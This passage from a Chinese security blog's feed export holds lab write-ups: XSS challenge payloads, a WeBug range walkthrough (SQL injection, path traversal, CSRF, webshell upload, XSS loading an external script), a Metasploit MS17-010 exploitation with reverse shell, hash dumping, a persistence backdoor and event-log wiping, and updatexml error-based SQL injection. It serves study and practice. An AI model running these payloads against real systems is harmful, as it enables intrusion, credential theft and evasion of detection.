WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: user=&quot; onclick=alert(1) type=&quot;text&quot;Connection: close Level 14：查看源码 12&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt; payload： 1&quot;&gt;&lt;img src=1 onerror=alert(1)&gt; Level 15：12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;?&gt; ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 其payload为： 1src=level1.php?name=1&apos;window.alert() 或者包含第一关 1src=&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos; 参考文章：https://www.jianshu.com/p/06c644dafa0d ​ https://www.cnblogs.com/bmjoker/p/9446472.html]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebBug靶机实验]]></title>
    <url>%2F2019%2F02%2F25%2FWebBug%E9%9D%B6%E6%9C%BA%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[男儿不展同云志，空负天生八尺躯! weBug环境介绍: WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入门。 WeBug安装使用: 此安装包webug是3.0版本，所有的漏洞环境都已经搭建好了，解压后只要在vm虚拟机内打开，就可直接使用测试，无需繁琐的环境配置。具体操作：用winrar将安装包解压，用VM虚拟机打开解压文件里的win2003虚拟机文件。进入虚拟机系统后，打开命令行，输入：ipconfig，查看虚拟机的IP地址，然后直接在物理机的浏览器上输入该IP地址，就可以直接进入靶场了。 WeBug包含的漏洞: 目前该靶场包含以下漏洞（超全！特别适合练手）:get注入；图片破解；信息收集练习——目录端口收集；暴力破解练习；x-forwarded-for注入；支付漏洞；垂直越权；CSRF；url跳转；GET任意文件下载；POST任意文件下载；无验证上传；反射型XSS；存储型XSS；校验扩展名上传；验证来源去向的url跳转；文件包含；POST文件包含；HOST注入；APK破解；延时注入；DZ7.2论坛sql注入；aspcms注入；phpmyadmin任意文件包含漏洞；齐博系统SQL注入；海盗云商getshell；PHP168任意代码执行GET SHELL；ecshop 注入；ShopXp系统SQL注射漏洞；Dcore(轻型CMS系统)注入漏洞；MetInfo 任意文件包含漏洞可getshell；Metinfo news.php盲注；Metinfo img.php盲注；万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入；BEESCMS sql注入，无视防御；ourphp 注入；phpwind 命令执行漏洞；metinfo 任意用户密码修改；DZ 3.2 存储型XSS；DedeCMS flink.php友情链接注入；DedeCms?recommend.php注入；BEESCMS 小于等于V4四处注入+无需密码直接进后台；海洋 x-forwarded-for注入；php截断利用；st2-016；jboss命令执行；tomcat弱口令；hfs远程命令执行；st2-052命令执行；flash远程命令执行；gh0st远程溢出；IIS6.0远程溢出下载链接：https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ提取码：cfyr 第一关:普通的GET注入提交id为1,出现编号1的商品,输入1’,系统出现查询数据库错误的提示那么接下来爆系统SQL语句查询的字段个数,其payload为:1’ order by 5–+将数字5换成4,结果返回正常,证明其查询的字段数是4个 然后爆字段所在位置,其payload为:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,4--+ 得到查询的字段分别位于”编号”,”名称”,”价格”,”数量”的位置 查询当前用户,数据库版本,当前数据库名,其payload为:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,user(),version(),database()--+ 当前用户:root@localhost版本为:5.5.53数据库名:pentesterlab查所有数据库库名:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(schema_name)from information_schema.schemata --+ 得到的数据库为:information_schema,beecms,dedecmsv57gbk,dedecmsv57gbksp1,deescms,discuz,ecshop1,haidao,hiwiki,merinfo3,metinfo1,metinfo2,metinfoxiugai,mysql,ourphp,pentesterlab,performance_schema,php168,phpwind,qibo,seacms,test,ultrax,wanzhong,wiki,wiki11 查当前数据库中的表:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema=&apos;pentesterlab&apos;--+ 得到的当前数据库pentesterlab中的所有表名:comment,flag,goods,user 查找flag表中的列名:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;--+ 结果为:id,flag查看其值:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(id,0x7e,flag)from flag--+ 结果为:1~204f704fbbcf6acf398ffee11989b377 第二关: 从图中你能找到什么?将图片保存到本地,notepad++打开就发现密码啦,官方说这道题有问题…. 第三关:你看到了什么?查看源代码,原来是要扫目录呀,我用的是Windows系统,直接用御剑跑,Linux下可以用dirb或者dirbuster去跑 扫到了这个test目录,得到提示把目录名md5加密访问加密后的值得到flag 第四关:告诉你了FLAG是5位数遇到表单上burp爆破得到用户名admin.密码admin123但是登录了没反应,后来发现是源码有问题,作者将flag注释了…… 第五关:一个优点小小的特殊的注入X-Forwarded-For注入:https://www.freebuf.com/articles/web/164817.html两种方式解决这个问题(原理都是一样的)1,用burpsuite抓包,添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag第二种方式:使用火狐浏览器的Modify Headers,添加添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag,确定,刷新页面即可出现所查询的值 第六关:支付漏洞打开遇到个登录页面,爆破呗,得到账户名密码是tom/123456看着很像支付漏洞,抓包修改价格为0.1元,购买成功 第七关:越权问题使用系统提供的账号密码登录点击修改密码,发现是以GET请求的方式传递用户名进行修改密码的操作,那么尝试将用户名修改为admin用户,看能不能越权修改管理员账号payload:1http://192.168.239.131/pentest/test/3/change.php?name=admin 是可以修改admin的密码的,但是需要旧密码, 查看其源码,只要输入的两次新密码正确就可以修改啦,不对原密码进行确认:12345678if($pwd2==$pwd3)&#123; //更新记录$updateSql = &quot;update user set pwd = &apos;&quot;.$pwd2.&quot;&apos; where uid=&apos;&quot;.$uid.&quot;&apos;&quot;;$result = mysql_query($updateSql);if($result&gt;0)&#123; echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;更改密码成功，请重新登录！&apos;);location.href=&apos;index.html&apos;&lt;/script&gt;&quot;;&#125; 第八关:CSRF首先使用tom/123456登录,观察其URL为tom用户,将tom替换成admin即可修改管理员密码,然后输入新密码,burp抓包右键制作CSRF POC保存至一个HTML文件中,将访问该文件的网站链接发送给管理员,管理员一点击即可修改其密码为我刚刚修改之后的密码 第九关:URL跳转查看源码,发现index.php存在任意url跳转1234$url=$_REQUEST[&apos;url&apos;];if($url!=null||$url!=&quot;&quot;)&#123; echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;成功跳转！&apos;);location.href=&apos;&quot;.$url.&quot;&apos;&lt;/script&gt;&quot;;&#125; 那么其payload为:1http://192.168.239.131/pentest/test/5/index.php?url=www.baidu.com 第十关:GET类型任意下载漏洞打开链接提示404,查看源码源码又是源码写的有问题…..我们直接去访问download.php网址为:http://192.168.239.131/pentest/test/6/1/download.php点击下载,发现传递了一个参数fname 是下载的文件名 那么可能可以修改文件名实现任意文件下载,其payload为: 1http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/download.php 通过下载download.php这个文件证明存在任意文件下载漏洞,那么该去找存放管理员账号密码的文件我直接使用御剑扫描其后台,发现在http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件 那么构造的payload为:1http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php 第11关:POST类型任意下载漏洞第10关是通过GET请求下载文件,第11关是通过POST请求下载文件,直接修改变量pic的值为config.php文件的路径即可 第12关:D盘找密码上传个PHP木马,确定其上传路径直接传一句话木马，上传上去后，然后在菜刀中上传mimikatz得到系统管理员登录密码为123456~ 第13关:反射型XSS构造payload:1http://192.168.239.131/pentest/test/9/?id=&lt;script src=http://c7.gg/bSTkf&gt;&lt;/script&gt; 第14关:存储型XSS构造payload:1&lt;script&gt;alert(/xss/)&lt;/script&gt; 第15题:上传漏洞制作一个图片马,上传,burp修改文件名为php即可成功上传成功解析菜刀连接 第16题:明天双十一 我从公司网络去剁手了！折腾了一会没找到答案,查看源码 1234567891011121314151617if(strstr($url,&quot;www.taobao.com&quot;))&#123; if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; echo &quot;剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;; &#125;else&#123; echo &quot;不想剁手了&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;nono&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;哎呀，这里只允许10.10.10.10访问！！！&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;这个地方剁手不好，换个地方！&quot;; &#125; 发现必须要满足三个条件才可以获得flag1.请求参数url=www.taobao.com2.referer为www.baidu.com3.HOST值为10.10.10.10]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[与永恒之蓝的一场旅行]]></title>
    <url>%2F2019%2F02%2F19%2Fms17-010%2F</url>
    <content type="text"><![CDATA[不断进步,直到羔羊变成雄狮! 漏洞背景:继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。 针对此次泄露的漏洞，微软提前发布了安全公告 MS17-010，修复了泄露的多个 SMB 远程命令执行漏洞。由于此次泄露的漏洞覆盖了大部分常见的 Windows 版本(包括微软不再提供更新服务的 Windows XP 和 Windows Server 2003)，网络空间中仍然存在大量可被入侵的设备 漏洞原理:永恒之蓝漏洞是通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 影响版本:目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 目前在Metasploit上集成的攻击载荷是ms17_010_psexec和ms17_010_eternalblue,我在网上搜了好久,也没找到什么有价值的答案,我自己总结的是两点区别: 一:ms17_010_psexec是SMB的远程代码执行漏洞,ms17_010_eternalblue是SMB的远程窗口内核池损坏漏洞 二:ms17_010_psexec是针对于上述所说的Windows系统都适用的,而ms17_010_eternalblue只适用于win7和win server2008R2的全版本 这次我们使用ms17_010_psexec载荷进行渗透测试 利用前提:1.防火墙必须允许SMB流量出入 2.目标必须使用SMBv1协议 3.目标必须缺少MS17-010补丁 4.目标必须允许匿名IPC $和管道名 复现环境:攻击机:kali 4.15.0-kali2-amd64(192.168.135.134) 靶机:Windows server2003(192.168.135.136) 复现过程:信息收集使用nmap对目标系统进行信息收集同时去扫描目标存在的漏洞(Nessus或者AWVS等扫描器都可以) 1root@kali:~# nmap -sV --script=vuln -O 192.168.135.136 参数-sV表示对目标主机进行软件版本的检测 参数–script=vuln表示适用nmap自带的漏洞库区扫描目标系统存在的漏洞 参数-O表示扫描目标的操作系统 由于nmap默认扫描常用的一千个端口,所以我这里为了节省时间就没有加-p选项 扫出来啦鼎鼎有名的ms08-067漏洞和ms17-010漏洞这两个远程代码执行的漏洞 1234567891011121314Host script results:| smb-vuln-ms08-067: | VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.| | Disclosure date: 2008-10-23| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx 1234567891011121314smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 漏洞利用:配置数据库我们使用Metasploit-Framework(简称MSF)去利用ms17-010远程代码执行漏洞 我们首先需要创建一个自己的数据库,将等会使用MSF获取的结果保存到我们自己的数据库中(也可以使用metasploit自带的数据库),MSF默认使用的数据库管理系统是PostgreSQL 打开Postgresql服务: 1root@kali:~# service postgresql start 或者 12root@kali:~# /etc/init.d/postgresql start[ ok ] Starting postgresql (via systemctl): postgresql.service. 查看数据库运行状态: 123456789root@kali:~# service postgresql status ● postgresql.service - PostgreSQL RDBMS Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled) Active: active (exited) since Mon 2019-02-18 16:22:16 CST; 24h ago Process: 11732 ExecStart=/bin/true (code=exited, status=0/SUCCESS) Main PID: 11732 (code=exited, status=0/SUCCESS)2月 18 16:22:16 kali systemd[1]: Starting PostgreSQL RDBMS...2月 18 16:22:16 kali systemd[1]: Started PostgreSQL RDBMS. 切换到postgres用户(Postgresql数据库管理系统所创建的用户) 1root@kali:~# su - postgres 创建数据库管理员kkk: 1234root@kali:~# su - postgres postgres@kali:~$ createuser kkk -P为新角色输入的口令: 再输入一遍: 创建数据库及其属主,其语法为createdb –owner=属主 数据库名 1postgres@kali:~$ createdb --owner=kkk database1 然后就可以打开MSF终端利用漏洞啦 1root@kali:~# msfconsole 查看当前所连接的数据库: 12msf &gt; db_status [*] postgresql connected to msf 断开连接,连接我们刚刚创建的数据库, 断开数据库连接命令:db_disconnent 连接新的数据库:格式是db_connect 用户名:密码@127.0.0.1/数据库名 12msf &gt; db_disconnect msf &gt; db_connect kkk:passwd@127.0.0.1/database1 确认漏洞这部分其实就是确认nmap扫描的结果是否准确,MSF提供专门扫描MS17-010的payload(载荷)我们可以在这里尝试一番,熟悉命令 123456789101112msf &gt; search ms17-010 //在漏洞库中搜索ms17-010的payload[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/smb/ms17_010_command 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_psexec 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 我们使用auxiliary辅助模块中的ms17_010_command载荷去扫描确认目标系统是否真的有SMB服务的远程代码执行的漏洞 1234567891011121314151617181920212223242526272829303132msf &gt; use auxiliary/admin/smb/ms17_010_command //使用该载荷msf auxiliary(admin/smb/ms17_010_command) &gt; set rhosts 192.168.135.136 //设置目标rhosts =&gt; 192.168.135.136msf auxiliary(admin/smb/ms17_010_command) &gt; exploit //进行攻击[*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 192.168.135.136:445 - Filling barrel with fish... done[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - [*] Preparing dynamite...[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom![*] 192.168.135.136:445 - [+] Successfully Leaked Transaction![*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8fdf1cb0[*] 192.168.135.136:445 - Built a write-what-where primitive...[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.135.136:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.135.136:445 - Output for &quot;net group &quot;Domain Admins&quot; /domain&quot;:ةĻ Domain Adminsעˍ ָ¶¨µœꝀ³ʔ±-------------------------------------------------------------------------------Administrator ļ®³ɹ¦Ϊ³ɡ£[+] 192.168.135.136:445 - Cleanup was successful[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Successful 而且目标为Administrator 权限 攻击目标123msf auxiliary(admin/smb/ms17_010_command) &gt; use exploit/windows/smb/ms17_010_psexec //使用攻击模块msf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.135.136 //设置目标rhost =&gt; 192.168.135.136 对于ms17_010_psexec攻击脚本,不需要设置payload,我原先设置windows/x64/meterpreter/reverse_tcp 载荷一直不出来结果,后来才得知这个攻击脚本里面有meterpreter的载荷,无需设置即可 1234567891011121314151617181920212223242526msf exploit(windows/smb/ms17_010_psexec) &gt; exploit //开始攻击[*] Started reverse TCP handler on 192.168.135.134:4444 [*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 192.168.135.136:445 - Filling barrel with fish... done[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - [*] Preparing dynamite...[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom![*] 192.168.135.136:445 - [+] Successfully Leaked Transaction![*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8f3e37c0[*] 192.168.135.136:445 - Built a write-what-where primitive...[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained![*] 192.168.135.136:445 - Selecting native target[*] 192.168.135.136:445 - Uploading payload...[*] 192.168.135.136:445 - Created \ZKbfdlYf.exe...[+] 192.168.135.136:445 - Service started successfully...[*] 192.168.135.136:445 - Deleting \ZKbfdlYf.exe...[-] 192.168.135.136:445 - Delete of \ZKbfdlYf.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)[*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 1 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2240) at 2019-02-19 19:13:26 +0800meterpreter &gt; //攻击成功,拿到目标的会话 后渗透阶段先介绍一下Meterpreter: Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 在后渗透阶段我们将使用Meterpreter进行攻击 1234567891011121314151617181920meterpreter &gt; help //输入help命令可以查看在meterpreter模块下执行的命令meterpreter &gt; sysinfo //查看系统信息Computer : MYCOMPUTEROS : Windows .NET Server (Build 3790, Service Pack 2).Architecture : x86System Language : zh_CNDomain : LOUISNIELogged On Users : 3Meterpreter : x86/windowsmeterpreter &gt; getsystem //提升到system权限...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; hashdump //导出SAM数据库的内容Administrator:500:570ce399da1412abaad3b435b51404ee:b9d2d4955b330b503cc792eb6a55bb1f:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98e07fb45acadfe5febbf70690d16ae0:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:18861c2baa27b5a9100c04acbbfa47d9:::IUSR_MYCOMPUTER:1108:e2e508b31b1336d2c996f97338db8790:03320631cb387004f82daec52f03935f:::IWAM_MYCOMPUTER:1109:fc512ee6de7b912f77747be12787d540:0f8f47aec1c4bc8897a81bce48cc20da:::MYCOMPUTER$:1005:aad3b435b51404eeaad3b435b51404ee:979f58fb772361956a63f2bc34036a09::: SAM简介: SAM是windows系统的一个系统用户账号管理文件。其全称为security account manager。Windows中对用户账户的安全管理使用了安全账号管理器SAM(security account manager)的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。 其文件位置：C:\windows\system32\config\SAM 其格式是 用户名称:RID:LM-HASH值:NT-HASH::: 在Windows系统下,有两大hash,分别是LM HASH&amp;NT HASH 对于NT HASH,我们直接可以在cmd5网站进行解密,解密Administrator用户密码为redhat 1234567891011121314151617181920212223242526272829303132333435363738394041424344msf exploit(windows/smb/ms17_010_psexec) &gt;run post/windows/manage/enable_rdp //打开目标服务器的远程连接msf exploit(windows/smb/ms17_010_psexec) &gt;exploitmeterpreter &gt; portfwd add -l 2222 -r 192.168.135.136 -p 3389 //反弹目标的3389端口到本地的2222端口并监听该端口[*] Local TCP relay created: :2222 &lt;-&gt; 192.168.135.136:3389meterpreter &gt; portfwd //查看是否反弹成功Active Port Forwards==================== Index Local Remote Direction ----- ----- ------ --------- 1 0.0.0.0:2222 192.168.135.136:3389 Forward1 total active port forwards.root@kali:~# netstat -an | grep &quot;2222&quot; //我们在kali查看2222端口是在监听状态tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN root@kali:~# rdesktop 127.0.0.1:2222 //连接本地的2222端口反弹到目标的3389端口,即打开目标的桌面meterpreter &gt; ps //查看系统进程Process List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 NT AUTHORITY\SYSTEM 240 2792 mstsc.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\mstsc.exe 264 4 smss.exe x86 0 NT AUTHORITY\SYSTEM \SystemRoot\System32\smss.exe 292 808 explorer.exe x86 0 LOUISNIE\Administrator C:\WINDOWS\Explorer.EXE 312 264 csrss.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\csrss.exe 336 264 winlogon.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\winlogon.exe 384 336 services.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe 396 336 lsass.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe 452 1744 wuauclt.exe x86 2 LOUISNIE\Administrator C:\WINDOWS\system32\wuauclt.exe 588 384 vmacthlp.exe x86 0 NT AUTHORITY\SYSTEM meterpreter &gt; migrate 292 //将该会话和系统进程绑定,免杀.格式是:migrate PID meterpreter &gt; execute -H -i -f cmd.exe //创建新进程cmd.exe，-H不可见，-i交互 -f用系统命令去执行meterpreter &gt; kali 1569 //杀死进程,格式是:kali PID 植入后门,维持控制 1234567891011121314151617181920212223242526272829msf exploit(windows/smb/ms17_010_psexec) &gt; sessions -i 2 //开启第二个会话[*] Starting interaction with 2...meterpreter &gt; run persistence - X -i 5 -p 4445 -r 192.168.135.136 //运行后门程序，-X指定启动的方式为开机自启动，-i反向连接的时间间隔[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3953/MYCOMPUTER_20190219.3953.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.135.136 LPORT=4445[*] Persistent agent script is 99670 bytes longmeterpreter &gt; background [*] Backgrounding session 2...msf exploit(windows/smb/ms17_010_psexec) &gt; back msf &gt; use exploit/multi/handler //使用exploit/multi/handler监听连入的backdoormsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp //设置载荷payload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.135.134 //设置将反弹到本地来lhost =&gt; 192.168.135.134msf exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 192.168.135.134:4444 [*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 3 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2364) at 2019-02-19 21:42:12 +0800[*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 4 opened (192.168.135.1 或者我们可以使用metsvc模块来留下后门 metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件： metsvc.dll metsvc-service.exe metsvc.exe 12msf exploit(multi/handler) &gt; sessions -i 2 //选择一个会话meterpreter &gt; run metsvc //运行metsvc 清除日志: 1234meterpreter &gt; clearev [*] Wiping 1 records from Application...[*] Wiping 26 records from System...[*] Wiping 2281 records from Security...]]></content>
      <categories>
        <category>主机渗透</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之基于函数报错的信息获取]]></title>
    <url>%2F2019%2F01%2F07%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%2F</url>
    <content type="text"><![CDATA[人生舞台的大幕随时都可能拉开，关键是你愿意表演，还是选择躲避。 实验环境:pikachu靶机 基于函数报错的信息获取1.常用的报错函数updatexml(),extractvalue(),floor()2.基于函数报错的信息获取(select,insert,update,delete) 技巧思路:在MySQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息select/insert/update/delete都可以使用报错来获取信息 背景条件:后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端 updatexml函数使用方法updatexml():函数是MySQL对XML文档数据进行查询和修改的XPATH函数updatexml()函数作用:改变(查找并替换)XML文档中符合条件的节点的值语法:updatexml(xml_document,xpathstring,new_value)第一个参数:XML文档的名称第二个参数:XML文档的位置(路径),通过xpath定位 ,也可以是表达式,那么数据库便会将这个表达式去执行第三个参数:new_value,string格式,替换查找到的符合条件的注:xpath定位必须是有效的,否则会发生错误 基于updatexml()报错进行信息获取基于报错信息获取数据,必须要有报错信息的返回 我们使用updatexml()函数构造报错,获取数据库信息使用concat函数将两个字符串一起打印出来,concat中也可以执行表达式(函数)0x7e:为~的16进制,其目的为避免信息不被系统去掉,将结果构造出完整的字符串查看其数据库版本信息:1123&apos; and updatexml(1,concat(0x7e,version()),0)# 查看当前数据库信息: 1123&apos; and updatexml(1,concat(0x7e,database()),0)# 查看当前数据库第一张表:1123&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&quot;pikachu&quot; limit 0,1)),0)# 查出第一个表为httpinfo 依次查询得到的表为httpinfo,membr,message,users,xssblind 查看users表的字段:1123&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1)),0)# 得到users表第一个字段为id,第二个字段为username,第三个字段为password,第四个为level 查看用户名1123&apos; and 